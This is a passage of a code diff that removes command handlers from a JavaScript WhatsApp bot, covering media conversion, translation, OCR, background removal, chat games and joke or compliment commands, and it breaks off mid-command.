-    await X.sendMessage(m.chat, { react: { text: '📸', key: m.key } })
-if (!text) return reply(`Example: ${prefix}ssweb https://google.com`)
-try {
-let ssUrl = `https://image.thum.io/get/width/1280/crop/720/noanimate/${text}`
-await X.sendMessage(m.chat, { image: { url: ssUrl }, caption: `*Screenshot:* ${text}` }, { quoted: m })
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'trt':
-case 'translate': {
-    await X.sendMessage(m.chat, { react: { text: '🌐', key: m.key } })
-if (!text) return reply(`Example: ${prefix}trt en|hello world\nOr reply to a message: ${prefix}trt en`)
-try {
-let targetLang = 'en'
-let inputText = ''
-if (text.includes('|')) {
-let parts = text.split('|')
-targetLang = parts[0].trim()
-inputText = parts.slice(1).join('|').trim()
-} else if (m.quoted) {
-targetLang = text.trim() || 'en'
-inputText = m.quoted.text || ''
-} else {
-inputText = text
-}
-if (!inputText) return reply('No text to translate.')
-let res = await fetch(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(inputText)}&langpair=auto|${targetLang}`)
-let data = await res.json()
-let translated = data.responseData?.translatedText || 'Translation failed.'
-reply(`╔══════════════════════════╗\n║  🌐 *TRANSLATION*\n╚══════════════════════════╝\n\n  └ 🔤 *${targetLang.toUpperCase()}*\n\n${translated}`)
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'transcribe': {
-    await X.sendMessage(m.chat, { react: { text: '🎙️', key: m.key } })
-if (!m.quoted || !/audio/.test(m.quoted.mimetype || '')) return reply(`Reply to an audio with ${prefix}transcribe`)
-reply('*Transcribe:* Audio transcription requires a paid API. Use AI commands with audio description instead.')
-} break
-
-case 'locate':
-case 'location': {
-    await X.sendMessage(m.chat, { react: { text: '📍', key: m.key } })
-if (!text) return reply(`Example: ${prefix}location Nairobi, Kenya`)
-try {
-let res = await fetch(`https://nominatim.openstreetmap.org/search?q=${encodeURIComponent(text)}&format=json&limit=1`, { headers: { 'User-Agent': 'ToosiiBot/1.0' } })
-let data = await res.json()
-if (!data.length) return reply('Location not found.')
-let loc = data[0]
-await X.sendMessage(m.chat, { location: { degreesLatitude: parseFloat(loc.lat), degreesLongitude: parseFloat(loc.lon) }, caption: loc.display_name }, { quoted: m })
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'tourl': {
-    await X.sendMessage(m.chat, { react: { text: '🔗', key: m.key } })
-// Upload any media (image/video/audio/doc/sticker) and return a public CDN link
-if (!m.quoted) return reply(`📎 *Reply to any media* (image, video, audio, doc, sticker) with *${prefix}tourl*`)
-try {
-    await reply('📤 _Uploading media..._')
-    const _buf = await m.quoted.download()
-    if (!_buf || _buf.length < 100) throw new Error('Download failed — media may have expired')
-    // Write with correct extension based on mimetype
-    const _mime = m.quoted.mimetype || m.quoted.msg?.mimetype || 'application/octet-stream'
-    const _extMap = {'image/jpeg':'jpg','image/png':'png','image/webp':'webp','image/gif':'gif','video/mp4':'mp4','audio/mpeg':'mp3','audio/ogg':'ogg','audio/mp4':'m4a','application/pdf':'pdf'}
-    const _ext = _extMap[_mime.split(';')[0].trim()] || 'bin'
-    const _tmp = `/tmp/tourl_${Date.now()}.${_ext}`
-    require('fs').writeFileSync(_tmp, _buf)
-    const _url = await CatBox(_tmp)
-    require('fs').unlinkSync(_tmp)
-    if (!_url || !_url.startsWith('http')) throw new Error('Upload failed — try again')
-    await X.sendMessage(m.chat, {
-        text: `✅ *Media uploaded!*\n\n🔗 *URL:*\n${_url}\n\n📦 _Size: ${(_buf.length/1024).toFixed(1)} KB | Type: ${_mime.split(';')[0]}_`
-    }, { quoted: m })
-} catch(e) { reply(`❌ *tourl failed:* ${e.message}`) }
-} break
-
-case 'simage':
-case 'timage':
-case 'toimage': {
-    await X.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
-// Convert sticker (webp) → image (jpeg/png)
-const _qmtype = m.quoted?.mtype || ''
-const _qmime = m.quoted?.mimetype || m.quoted?.msg?.mimetype || ''
-const _isSticker = _qmtype === 'stickerMessage' || /webp/.test(_qmime)
-if (!m.quoted || !_isSticker) return reply(`🖼️ *Reply to a sticker* with *${prefix}toimage* to convert it to an image`)
-try {
-    await reply('🔄 _Converting sticker to image..._')
-    const _buf = await m.quoted.download()
-    if (!_buf || _buf.length < 100) throw new Error('Sticker download failed')
-    // Use jimp to convert webp → jpeg since WA webp may be animated
-    const _outPath = `/tmp/toimage_${Date.now()}`
-    require('fs').writeFileSync(`${_outPath}.webp`, _buf)
-    // ffmpeg: webp → png (handles both static and animated, takes first frame)
-    await new Promise((resolve, reject) => {
-        require('child_process').exec(
-            `ffmpeg -y -i ${_outPath}.webp -vframes 1 -f image2 ${_outPath}.png`,
-            (err) => err ? reject(err) : resolve()
-        )
-    })
-    const _img = require('fs').readFileSync(`${_outPath}.png`)
-    await X.sendMessage(m.chat, { image: _img, caption: '🖼️ *Sticker → Image*' }, { quoted: m })
-    try { require('fs').unlinkSync(`${_outPath}.webp`); require('fs').unlinkSync(`${_outPath}.png`) } catch {}
-} catch(e) { reply(`❌ *toimage failed:* ${e.message}`) }
-} break
-
-case 'totext': {
-    await X.sendMessage(m.chat, { react: { text: '📝', key: m.key } })
-// Extract text from an image using OCR via pollinations vision API
-if (!m.quoted || !/image/.test(m.quoted.mimetype || m.quoted.msg?.mimetype || '')) {
-    return reply(`📄 *Reply to an image* with *${prefix}totext* to extract all text from it\n\n_Works on screenshots, documents, signs, receipts, etc._`)
-}
-try {
-    await reply('🔍 _Reading text from image..._')
-    const _imgBuf = await m.quoted.download()
-    if (!_imgBuf || _imgBuf.length < 100) throw new Error('Image download failed')
-    const _mime = m.quoted.mimetype || m.quoted.msg?.mimetype || 'image/jpeg'
-    const _b64 = _imgBuf.toString('base64')
-    const _prompt = 'Extract ALL text from this image exactly as it appears. Preserve formatting, line breaks, and structure. If no text is found, say "No text detected."'
-    let _extracted = null
-    // Primary: pollinations base64 vision
-    try {
-        const { data: _d } = await axios.post('https://text.pollinations.ai/openai', {
-            model: 'openai', max_tokens: 2000, stream: false,
-            messages: [{ role: 'user', content: [
-                { type: 'text', text: _prompt },
-                { type: 'image_url', image_url: { url: `data:${_mime};base64,${_b64}` } }
-            ]}]
-        }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-        _extracted = _d?.choices?.[0]?.message?.content
-    } catch {}
-    // Fallback: upload to catbox then use URL
-    if (!_extracted) {
-        const _tmp = `/tmp/totext_${Date.now()}.jpg`
-        require('fs').writeFileSync(_tmp, _imgBuf)
-        const _uploadUrl = await CatBox(_tmp)
-        require('fs').unlinkSync(_tmp)
-        if (_uploadUrl && _uploadUrl.startsWith('http')) {
-            const { data: _d2 } = await axios.post('https://text.pollinations.ai/openai', {
-                model: 'openai', max_tokens: 2000, stream: false,
-                messages: [{ role: 'user', content: [
-                    { type: 'text', text: _prompt },
-                    { type: 'image_url', image_url: { url: _uploadUrl } }
-                ]}]
-            }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-            _extracted = _d2?.choices?.[0]?.message?.content
-        }
-    }
-    if (!_extracted) throw new Error('Could not extract text — try a clearer image')
-    reply(`╔══════════════════════════╗\n║  📄 *EXTRACTED TEXT*\n╚══════════════════════════╝\n\n${_extracted}`)
-} catch(e) { reply(`❌ *totext failed:* ${e.message}`) }
-} break
-
-case 'toaudio':
-case 'tomp3': {
-    await X.sendMessage(m.chat, { react: { text: '🎵', key: m.key } })
-// Convert video → MP3 audio using ffmpeg
-const _qmime2 = m.quoted?.mimetype || m.quoted?.msg?.mimetype || ''
-if (!m.quoted || !/video|audio/.test(_qmime2)) return reply(`🎵 *Reply to a video* with *${prefix}tomp3* to extract its audio as MP3`)
-try {
-    await reply('🔄 _Extracting audio from video..._')
-    const _vBuf = await m.quoted.download()
-    if (!_vBuf || _vBuf.length < 100) throw new Error('Video download failed')
-    const _vPath = `/tmp/tomp3_in_${Date.now()}.mp4`
-    const _aPath = `/tmp/tomp3_out_${Date.now()}.mp3`
-    require('fs').writeFileSync(_vPath, _vBuf)
-    await new Promise((resolve, reject) => {
-        require('child_process').exec(
-            `ffmpeg -y -i "${_vPath}" -vn -acodec libmp3lame -ab 128k -ar 44100 "${_aPath}"`,
-            { timeout: 120000 },
-            (err, _so, se) => err ? reject(new Error(se || err.message)) : resolve()
-        )
-    })
-    const _mp3 = require('fs').readFileSync(_aPath)
-    await X.sendMessage(m.chat, {
-        audio: _mp3, mimetype: 'audio/mpeg',
-        fileName: `audio_${Date.now()}.mp3`
-    }, { quoted: m })
-    try { require('fs').unlinkSync(_vPath); require('fs').unlinkSync(_aPath) } catch {}
-} catch(e) { reply(`❌ *tomp3 failed:* ${e.message}`) }
-} break
-
-case 'toppt':
-case 'tovoice': {
-    await X.sendMessage(m.chat, { react: { text: '🔊', key: m.key } })
-// Convert any audio or video → WhatsApp voice note (ogg opus ptt)
-const _qmime3 = m.quoted?.mimetype || m.quoted?.msg?.mimetype || ''
-if (!m.quoted || !/audio|video/.test(_qmime3)) return reply(`🎤 *Reply to an audio or video* with *${prefix}toppt* to convert it to a voice note`)
-try {
-    await reply('🔄 _Converting to voice note..._')
-    const _inBuf = await m.quoted.download()
-    if (!_inBuf || _inBuf.length < 100) throw new Error('Media download failed')
-    const _inExt = /video/.test(_qmime3) ? 'mp4' : 'mp3'
-    const _inPath = `/tmp/toppt_in_${Date.now()}.${_inExt}`
-    const _outPath = `/tmp/toppt_out_${Date.now()}.ogg`
-    require('fs').writeFileSync(_inPath, _inBuf)
-    await new Promise((resolve, reject) => {
-        require('child_process').exec(
-            `ffmpeg -y -i "${_inPath}" -vn -c:a libopus -b:a 64k -ar 48000 -ac 1 "${_outPath}"`,
-            { timeout: 120000 },
-            (err, _so, se) => err ? reject(new Error(se || err.message)) : resolve()
-        )
-    })
-    const _ogg = require('fs').readFileSync(_outPath)
-    await X.sendMessage(m.chat, {
-        audio: _ogg, mimetype: 'audio/ogg; codecs=opus', ptt: true
-    }, { quoted: m })
-    try { require('fs').unlinkSync(_inPath); require('fs').unlinkSync(_outPath) } catch {}
-} catch(e) { reply(`❌ *toppt failed:* ${e.message}`) }
-} break
-
-case 'removebg': {
-    await X.sendMessage(m.chat, { react: { text: '✂️', key: m.key } })
-// Remove image background — uses remove.bg API if key set, otherwise free fallback via photoroom
-if (!m.quoted || !/image/.test(m.quoted.mimetype || m.quoted.msg?.mimetype || '')) {
-    return reply(`🖼️ *Reply to an image* with *${prefix}removebg* to remove its background`)
-}
-try {
-    await reply('✂️ _Removing background..._')
-    const _rBuf = await m.quoted.download()
-    if (!_rBuf || _rBuf.length < 100) throw new Error('Image download failed')
-    let _result = null
-    // Primary: remove.bg (if API key configured)
-    const _rbKey = process.env.REMOVEBG_KEY || global.removebgKey || ''
-    if (_rbKey) {
-        try {
-            const _fd = new FormData()
-            _fd.append('image_file', _rBuf, { filename: 'image.jpg', contentType: 'image/jpeg' })
-            _fd.append('size', 'auto')
-            const _rbRes = await axios.post('https://api.remove.bg/v1.0/removebg', _fd, {
-                headers: { ..._fd.getHeaders(), 'X-Api-Key': _rbKey },
-                responseType: 'arraybuffer', timeout: 30000
-            })
-            if (_rbRes.status === 200) _result = Buffer.from(_rbRes.data)
-        } catch {}
-    }
-    // Fallback: photoroom free API (no key needed)
-    if (!_result) {
-        try {
-            const _fd2 = new FormData()
-            _fd2.append('image_file', _rBuf, { filename: 'image.jpg', contentType: 'image/jpeg' })
-            const _prRes = await axios.post('https://sdk.photoroom.com/v1/segment', _fd2, {
-                headers: { ..._fd2.getHeaders() },
-                responseType: 'arraybuffer', timeout: 30000
-            })
-            if (_prRes.status === 200) _result = Buffer.from(_prRes.data)
-        } catch {}
-    }
-    // Fallback 2: remove.bg unofficial endpoint
-    if (!_result) {
-        try {
-            const _tmp2 = `/tmp/rmbg_${Date.now()}.jpg`
-            require('fs').writeFileSync(_tmp2, _rBuf)
-            const _uploadedUrl = await CatBox(_tmp2)
-            require('fs').unlinkSync(_tmp2)
-            if (_uploadedUrl?.startsWith('http')) {
-                const _fd3 = new FormData()
-                _fd3.append('image_url', _uploadedUrl)
-                _fd3.append('size', 'auto')
-                const _rbRes2 = await axios.post('https://api.remove.bg/v1.0/removebg', _fd3, {
-                    headers: { ..._fd3.getHeaders(), 'X-Api-Key': 'DEMO' },
-                    responseType: 'arraybuffer', timeout: 30000
-                })
-                if (_rbRes2.status === 200) _result = Buffer.from(_rbRes2.data)
-            }
-        } catch {}
-    }
-    if (!_result) throw new Error('All background removal services failed. Set REMOVEBG_KEY in env for best results.')
-    await X.sendMessage(m.chat, { image: _result, caption: '✅ *Background removed!*' }, { quoted: m })
-} catch(e) { reply(`❌ *removebg failed:* ${e.message}`) }
-} break
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Game Commands
-case 'tictactoe':
-case 'ttt': {
-    await X.sendMessage(m.chat, { react: { text: '❎', key: m.key } })
-if (!m.isGroup) return reply(mess.OnlyGrup)
-let tttUser = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : null
-if (!tttUser) return reply(`Usage: ${prefix}ttt @opponent`)
-if (tttUser === sender) return reply('You cannot play against yourself!')
-if (!global.tttGames) global.tttGames = {}
-let gameId = m.chat
-if (global.tttGames[gameId]) return reply('A game is already in progress in this chat. Use .tttend to end it.')
-global.tttGames[gameId] = { board: [' ',' ',' ',' ',' ',' ',' ',' ',' '], players: { X: sender, O: tttUser }, turn: 'X' }
-let boardDisplay = (b) => `\`\`\`\n ${b[0]} | ${b[1]} | ${b[2]}\n---+---+---\n ${b[3]} | ${b[4]} | ${b[5]}\n---+---+---\n ${b[6]} | ${b[7]} | ${b[8]}\n\`\`\``
-X.sendMessage(from, { text: `*Tic Tac Toe*\n\n@${sender.split('@')[0]} (X) vs @${tttUser.split('@')[0]} (O)\n\n${boardDisplay(global.tttGames[gameId].board)}\n\n@${sender.split('@')[0]}'s turn (X)\nReply with a number (1-9) to place your mark.`, mentions: [sender, tttUser] }, { quoted: m })
-} break
-
-case 'tttend': {
-    await X.sendMessage(m.chat, { react: { text: '🏁', key: m.key } })
-if (!global.tttGames || !global.tttGames[m.chat]) return reply('No game in progress.')
-delete global.tttGames[m.chat]
-reply('*Game ended.*')
-} break
-
-case 'connect4':
-case 'c4': {
-    await X.sendMessage(m.chat, { react: { text: '🔴', key: m.key } })
-reply('*Connect 4:* Coming soon! Use .ttt for Tic Tac Toe.')
-} break
-
-case 'hangman': {
-    await X.sendMessage(m.chat, { react: { text: '🎯', key: m.key } })
-if (!global.hangmanGames) global.hangmanGames = {}
-if (global.hangmanGames[m.chat]) return reply('A hangman game is already in progress! Use .hangmanend to end it.')
-let words = ['javascript', 'python', 'programming', 'computer', 'algorithm', 'database', 'internet', 'software', 'hardware', 'keyboard', 'function', 'variable', 'boolean', 'whatsapp', 'telegram', 'android', 'network', 'security', 'elephant', 'universe']
-let word = words[Math.floor(Math.random() * words.length)]
-global.hangmanGames[m.chat] = { word, guessed: [], lives: 6, players: [sender] }
-let display = word.split('').map(l => '_').join(' ')
-reply(`╔══════════════════════════╗\n║  🪢 *HANGMAN*\n╚══════════════════════════╝\n\n  ${display}\n\n  ├ ❤️  Lives › 6\n  └ 🔡 Letters › ${word.length}\n\n  _Send a single letter to guess!_`)
-} break
-
-case 'hangmanend': {
-    await X.sendMessage(m.chat, { react: { text: '🏁', key: m.key } })
-if (!global.hangmanGames || !global.hangmanGames[m.chat]) return reply('No hangman game in progress.')
-reply(`╔══════════════════════════╗\n║  🏁 *GAME ENDED*\n╚══════════════════════════╝\n\n  └ 🔡 *Word* › *${global.hangmanGames[m.chat].word}*`)
-delete global.hangmanGames[m.chat]
-} break
-
-case 'trivia': {
-    await X.sendMessage(m.chat, { react: { text: '🧠', key: m.key } })
-try {
-let res = await fetch('https://opentdb.com/api.php?amount=1&type=multiple')
-let data = await res.json()
-if (!data.results || !data.results.length) return reply('Failed to fetch trivia.')
-let q = data.results[0]
-let answers = [...q.incorrect_answers, q.correct_answer].sort(() => Math.random() - 0.5)
-let decode = (str) => str.replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&quot;/g,'"').replace(/&#039;/g,"'")
-if (!global.triviaGames) global.triviaGames = {}
-global.triviaGames[m.chat] = { answer: decode(q.correct_answer).toLowerCase(), timeout: setTimeout(() => { if (global.triviaGames[m.chat]) { reply(`⏰ *Time up!*  The answer was: *${decode(q.correct_answer)}*`); delete global.triviaGames[m.chat] } }, 30000) }
-let qText = `*Trivia (${decode(q.category)})*\nDifficulty: ${q.difficulty}\n\n${decode(q.question)}\n\n`
-answers.forEach((a, i) => qText += `${String.fromCharCode(65+i)}. ${decode(a)}\n`)
-qText += `\nAnswer within 30 seconds!`
-reply(qText)
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'answer': {
-    await X.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
-if (!global.triviaGames || !global.triviaGames[m.chat]) return reply('No trivia in progress. Use .trivia to start.')
-let userAnswer = text?.toLowerCase().trim()
-if (!userAnswer) return reply('Please provide your answer.')
-if (userAnswer === global.triviaGames[m.chat].answer || userAnswer === global.triviaGames[m.chat].answer.charAt(0)) {
-clearTimeout(global.triviaGames[m.chat].timeout)
-delete global.triviaGames[m.chat]
-reply(`*Correct!* Well done, @${sender.split('@')[0]}! 🎉`)
-} else reply(`❌ *Wrong!* Try again or wait for timeout.`)
-} break
-
-case 'truth': {
-    await X.sendMessage(m.chat, { react: { text: '💬', key: m.key } })
-    if (m.isGroup && global.antiSocialGames && global.antiSocialGames[m.chat]) return reply(`❌ *Social games are disabled in this group.*`)
-let truths = ['What is your biggest fear?', 'What is the most embarrassing thing you have done?', 'What is a secret you have never told anyone?', 'Who was your first crush?', 'What is the worst lie you have told?', 'What is your guilty pleasure?', 'Have you ever cheated on a test?', 'What is the most childish thing you still do?', 'What is your biggest insecurity?', 'What was your most awkward date?', 'Have you ever been caught lying?', 'What is the craziest thing on your bucket list?', 'What is the weirdest dream you have had?', 'If you could be invisible for a day what would you do?', 'What is the most stupid thing you have ever done?']
-reply(`╔══════════════════════════╗\n║  💬 *TRUTH*\n╚══════════════════════════╝\n\n  ${truths[Math.floor(Math.random() * truths.length)]}`)
-} break
-
-case 'dare': {
-    await X.sendMessage(m.chat, { react: { text: '🎯', key: m.key } })
-    if (m.isGroup && global.antiSocialGames && global.antiSocialGames[m.chat]) return reply(`❌ *Social games are disabled in this group.*`)
-let dares = ['Send a voice note singing your favorite song.', 'Change your profile picture to something funny for 1 hour.', 'Send the last photo in your gallery.', 'Text your crush right now.', 'Do 10 pushups and send a video.', 'Send a voice note doing your best animal impression.', 'Let someone else send a message from your phone.', 'Share your screen time report.', 'Send a selfie right now without filters.', 'Call the 5th person in your contacts and sing happy birthday.', 'Post a childhood photo in the group.', 'Let the group choose your status for 24 hours.', 'Send a voice note speaking in an accent.', 'Do a handstand and send proof.', 'Type with your eyes closed for the next message.']
-reply(`╔══════════════════════════╗\n║  🔥 *DARE*\n╚══════════════════════════╝\n\n  ${dares[Math.floor(Math.random() * dares.length)]}`)
-} break
-
-case '8ball': {
-    await X.sendMessage(m.chat, { react: { text: '🎱', key: m.key } })
-if (!text) return reply(`Example: ${prefix}8ball Will I pass my exam?`)
-let responses8 = ['It is certain.', 'It is decidedly so.', 'Without a doubt.', 'Yes definitely.', 'You may rely on it.', 'As I see it, yes.', 'Most likely.', 'Outlook good.', 'Yes.', 'Signs point to yes.', 'Reply hazy, try again.', 'Ask again later.', 'Better not tell you now.', 'Cannot predict now.', 'Concentrate and ask again.', 'Don\'t count on it.', 'My reply is no.', 'My sources say no.', 'Outlook not so good.', 'Very doubtful.']
-reply(`╔══════════════════════════╗\n║  🎱 *MAGIC 8-BALL*\n╚══════════════════════════╝\n\n  ❓ *${text}*\n\n  🎱 ${responses8[Math.floor(Math.random() * responses8.length)]}`)
-} break
-
-case 'cf':
-case 'coinflip':
-case 'flip': {
-    await X.sendMessage(m.chat, { react: { text: '🪙', key: m.key } })
-let coin = Math.random() < 0.5 ? 'Heads' : 'Tails'
-reply(`🪙 *Coin Flip* › *${coin}!*`)
-} break
-
-case 'dice':
-case 'roll': {
-    await X.sendMessage(m.chat, { react: { text: '🎲', key: m.key } })
-let sides = parseInt(args[0]) || 6
-let result = Math.floor(Math.random() * sides) + 1
-reply(`🎲 *Dice Roll (d${sides})* › *${result}*`)
-} break
-
-case 'rps': {
-    await X.sendMessage(m.chat, { react: { text: '✊', key: m.key } })
-let choices = ['rock', 'paper', 'scissors']
-let userChoice = (args[0] || '').toLowerCase()
-if (!['rock', 'paper', 'scissors', 'r', 'p', 's'].includes(userChoice)) return reply(`Usage: ${prefix}rps rock/paper/scissors`)
-if (userChoice === 'r') userChoice = 'rock'
-if (userChoice === 'p') userChoice = 'paper'
-if (userChoice === 's') userChoice = 'scissors'
-let botChoice = choices[Math.floor(Math.random() * 3)]
-let rpsResult = userChoice === botChoice ? 'Draw!' : (userChoice === 'rock' && botChoice === 'scissors') || (userChoice === 'paper' && botChoice === 'rock') || (userChoice === 'scissors' && botChoice === 'paper') ? 'You win! 🎉' : 'You lose! 😢'
-reply(`╔══════════════════════════╗\n║  ✂️  *ROCK PAPER SCISSORS*\n╚══════════════════════════╝\n\n  ├ 👤 *You* › ${userChoice}\n  ├ 🤖 *Bot* › ${botChoice}\n  └ 🏆 *${rpsResult}*`)
-} break
-
-case 'slot': {
-    await X.sendMessage(m.chat, { react: { text: '🎰', key: m.key } })
-let symbols = ['🍒', '🍋', '🍊', '🍇', '💎', '7️⃣', '🔔']
-let s1 = symbols[Math.floor(Math.random() * symbols.length)]
-let s2 = symbols[Math.floor(Math.random() * symbols.length)]
-let s3 = symbols[Math.floor(Math.random() * symbols.length)]
-let slotWin = s1 === s2 && s2 === s3 ? '🎉 JACKPOT! You won!' : s1 === s2 || s2 === s3 || s1 === s3 ? '😃 Two match! Small win!' : '😢 No match. Try again!'
-reply(`╔══════════════════════════╗\n║  🎰 *SLOT MACHINE*\n╚══════════════════════════╝\n\n  [ ${s1} | ${s2} | ${s3} ]\n\n  ${slotWin}`)
-} break
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Fun & Social Commands
-case 'compliment': {
-    await X.sendMessage(m.chat, { react: { text: '😊', key: m.key } })
-let compliments = ['You are an amazing person!', 'Your smile lights up the room!', 'You are incredibly talented!', 'The world is better with you in it!', 'You have a heart of gold!', 'Your kindness is inspiring!', 'You are a ray of sunshine!', 'You make everything better!', 'You are one of a kind!', 'Your energy is contagious!']
-let target = (m.mentionedJid && m.mentionedJid[0]) ? `@${m.mentionedJid[0].split('@')[0]}` : pushname
-reply(`╔══════════════════════════╗\n║  💐 *COMPLIMENT*\n╚══════════════════════════╝\n\n  👤 *${target}*\n  ${compliments[Math.floor(Math.random() * compliments.length)]}`)
-} break
-
-case 'insult': {
-    await X.sendMessage(m.chat, { react: { text: '😤', key: m.key } })
-let insults = ['You are the human equivalent of a participation award.', 'If you were a spice, you would be flour.', 'You bring everyone so much joy when you leave.', 'You are like a cloud. When you disappear it is a beautiful day.', 'You are proof that even evolution makes mistakes.', 'Light travels faster than sound, which is why you seemed bright until you spoke.']
-let target2 = (m.mentionedJid && m.mentionedJid[0]) ? `@${m.mentionedJid[0].split('@')[0]}` : pushname
-reply(`╔══════════════════════════╗\n║  🔥 *ROAST*\n╚══════════════════════════╝\n\n  👤 *${target2}*\n  ${insults[Math.floor(Math.random() * insults.length)]}`)
-} break
-
-case 'flirt': {
-    await X.sendMessage(m.chat, { react: { text: '😏', key: m.key } })
-let flirts = ['Are you a magician? Because whenever I look at you, everyone else disappears.', 'Do you have a map? I keep getting lost in your eyes.', 'Are you a campfire? Because you are hot and I want s\'more.', 'Is your name Google? Because you have everything I have been searching for.', 'Do you believe in love at first sight, or should I walk by again?', 'If beauty were time, you would be an eternity.']
-reply(`╔══════════════════════════╗\n║  💘 *FLIRT*\n╚══════════════════════════╝\n\n  ${flirts[Math.floor(Math.random() * flirts.length)]}`)
-} break
-
-case 'shayari': {
-    await X.sendMessage(m.chat, { react: { text: '✨', key: m.key } })
-let shayaris = ['Dil mein tere liye jagah hai,\nPar tu door hai, yeh kya wajah hai.', 'Teri yaad mein hum pagal hue,\nDuniya se hum bekhabar hue.', 'Mohabbat ka koi mol nahi,\nDil hai yeh koi phool nahi.', 'Zindagi mein teri kami hai,\nHar khushi adhuri si hai.', 'Tere bina zindagi se koi shikwa nahi,\nTere bina zindagi hai toh kya.']
-reply(`╔══════════════════════════╗\n║  📜 *SHAYARI*\n╚══════════════════════════╝\n\n  ${shayaris[Math.floor(Math.random() * shayaris.length)]}`)
-} break
-
-case 'goodnight': {
-    await X.sendMessage(m.chat, { react: { text: '🌙', key: m.key } })
-let gn = ['Sweet dreams! May tomorrow bring you joy. 🌙', 'Good night! Sleep tight and don\'t let the bugs bite! 💤', 'Wishing you a peaceful night full of beautiful dreams. ✨', 'Close your eyes and let the stars guide your dreams. 🌟', 'Good night! Tomorrow is a new opportunity. Rest well! 😴']
-reply(`╔══════════════════════════╗\n║  🌙 *GOOD NIGHT*\n╚══════════════════════════╝\n\n  ${gn[Math.floor(Math.random() * gn.length)]}`)
-} break
-
-case 'roseday': {
-    await X.sendMessage(m.chat, { react: { text: '🌹', key: m.key } })
-reply('🌹 *Happy Rose Day!* 🌹\nRoses are red, violets are blue, sending this beautiful rose just for you! May your day be as beautiful as a garden full of roses.')
-} break
-
-case 'character': {
-    await X.sendMessage(m.chat, { react: { text: '🎌', key: m.key } })
-let characters = ['Naruto Uzumaki', 'Goku', 'Luffy', 'Batman', 'Spider-Man', 'Iron Man', 'Sherlock Holmes', 'Harry Potter', 'Pikachu', 'Mario', 'Sonic', 'Link (Zelda)', 'Levi Ackerman', 'Tanjiro Kamado', 'Eren Yeager', 'Gojo Satoru']
-reply(`╔══════════════════════════╗\n║  🎭 *RANDOM CHARACTER*\n╚══════════════════════════╝\n\n  ${characters[Math.floor(Math.random() * characters.length)]}`)
-} break
-
-case 'ship': {
-    await X.sendMessage(m.chat, { react: { text: '💑', key: m.key } })
-    if (m.isGroup && global.antiSocialGames && global.antiSocialGames[m.chat]) return reply(`❌ *Social games are disabled in this group.*`)
-if (!m.isGroup) return reply(mess.OnlyGrup)
-let members = participants.map(p => p.id)
-let p1 = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : members[Math.floor(Math.random() * members.length)]
-let p2 = m.mentionedJid && m.mentionedJid[1] ? m.mentionedJid[1] : members[Math.floor(Math.random() * members.length)]
-let shipPercent = Math.floor(Math.random() * 101)
-let bar = '█'.repeat(Math.floor(shipPercent/10)) + '░'.repeat(10 - Math.floor(shipPercent/10))
-X.sendMessage(from, { text: `*💕 Love Ship 💕*\n\n@${p1.split('@')[0]} ❤️ @${p2.split('@')[0]}\n\n[${bar}] ${shipPercent}%\n\n${shipPercent > 80 ? 'Perfect match! 💕' : shipPercent > 50 ? 'Good chemistry! 💖' : shipPercent > 30 ? 'There is potential! 💛' : 'Not meant to be... 💔'}`, mentions: [p1, p2] }, { quoted: m })
-} break
-
-case 'simp': {
-    await X.sendMessage(m.chat, { react: { text: '😍', key: m.key } })
-    if (m.isGroup && global.antiSocialGames && global.antiSocialGames[m.chat]) return reply(`❌ *Social games are disabled in this group.*`)
-let simpTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : sender
-let simpLevel = Math.floor(Math.random() * 101)
-X.sendMessage(from, { text: `*Simp Meter:*\n@${simpTarget.split('@')[0]}\n\n${'🟩'.repeat(Math.floor(simpLevel/10))}${'⬜'.repeat(10 - Math.floor(simpLevel/10))} ${simpLevel}%\n\n${simpLevel > 80 ? 'MAXIMUM SIMP! 😂' : simpLevel > 50 ? 'Moderate simp 😏' : 'Not a simp 😎'}`, mentions: [simpTarget] }, { quoted: m })
-} break
-
-case 'wasted': {
-    await X.sendMessage(m.chat, { react: { text: '💀', key: m.key } })
-    if (m.isGroup && global.antiSocialGames && global.antiSocialGames[m.chat]) return reply(`❌ *Social games are disabled in this group.*`)
-let wastedTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : sender
-X.sendMessage(from, { text: `*WASTED*\n\n@${wastedTarget.split('@')[0]} is WASTED 💀\n\nR.I.P.`, mentions: [wastedTarget] }, { quoted: m })
-} break
-
-case 'stupid':
-case 'iq': {
-    await X.sendMessage(m.chat, { react: { text: '🧠', key: m.key } })
-    if (m.isGroup && global.antiSocialGames && global.antiSocialGames[m.chat]) return reply(`❌ *Social games are disabled in this group.*`)
-let iqTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : sender
-let iqScore = Math.floor(Math.random() * 80) + 70
-const iqMsg = iqScore > 130 ? 'Genius level! 🧠💡' : iqScore > 110 ? 'Above average mind 🎓' : iqScore > 90 ? 'Average intelligence 😊' : 'Room to grow! 📚'
-X.sendMessage(from, { text: `╔══════════════════════════╗\n║  🧠 *IQ METER*\n╚══════════════════════════╝\n\n  👤 @${iqTarget.split('@')[0]}\n\n  ${'🧠'.repeat(Math.min(10,Math.floor(iqScore/15)))}${'⬜'.repeat(10 - Math.min(10,Math.floor(iqScore/15)))} *IQ: ${iqScore}*\n\n  _${iqMsg}_`, mentions: [iqTarget] }, { quoted: m })
-} break
-
-case 'joke': {
-    await X.sendMessage(m.chat, { react: { text: '😂', key: m.key } })
-try {
-let res = await fetch('https://v2.jokeapi.dev/joke/Any?safe-mode')
-let data = await res.json()
